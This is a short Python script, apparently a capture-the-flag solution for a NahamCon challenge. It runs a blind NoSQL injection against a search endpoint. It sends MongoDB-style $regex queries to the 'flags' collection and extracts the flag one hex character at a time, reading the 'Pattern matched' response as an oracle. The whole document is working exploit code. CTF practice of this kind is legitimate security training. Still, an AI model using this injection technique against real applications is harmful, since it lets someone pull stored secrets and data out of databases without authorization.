import urllib
import requests
import string

url = 'http://challenge.nahamcon.com:31764/search'
charset = '0123456789abcdef'
known = 'flag{'


params = {
    'query': 'flag: { $regex: "^flag" }',
    'collection': 'flags'
}
query_string = urllib.parse.urlencode(params)
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

r = requests.post(url, data=query_string, headers=headers)

print(r.text)
print("Pattern matched" in r.text)

while len(known) < 37:
    for c in charset:
        guess = known + c
        params = {
            'query': 'flag: { $regex: "^' + guess + '" }',
            'collection': 'flags'
        }
        query_string = urllib.parse.urlencode(params)
        r = requests.post(url, data=query_string, headers=headers)
        if "Pattern matched" in r.text:
            known += c
            print("Progress:", known)
            break
